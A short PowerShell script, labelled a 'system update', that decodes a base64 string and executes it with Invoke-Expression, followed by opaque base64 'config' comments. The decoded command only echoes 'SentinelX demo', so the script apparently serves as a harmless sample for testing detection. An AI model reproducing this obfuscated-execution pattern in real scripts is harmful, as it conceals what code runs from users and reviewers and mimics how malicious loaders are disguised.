# System update script
$encoded = 'ZWNobyBTZW50aW5lbFggZGVtbw=='
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded
# config: 9bFlIkpYt5HfavHYMD5hzcS7hsPRxCcQPDRMQYnrLx571dR+RG/Owg==
# config: o9gRc2EQ5XgbzM6mlnYuYRbG6cktmb81jC4HGIIs5Hyox0EH5myw5A==
# config: srP01Y2CymOG0sludg6Bm4XJJMNZcWTEpgWKAFgaIrIt5QRyQz0uRA==
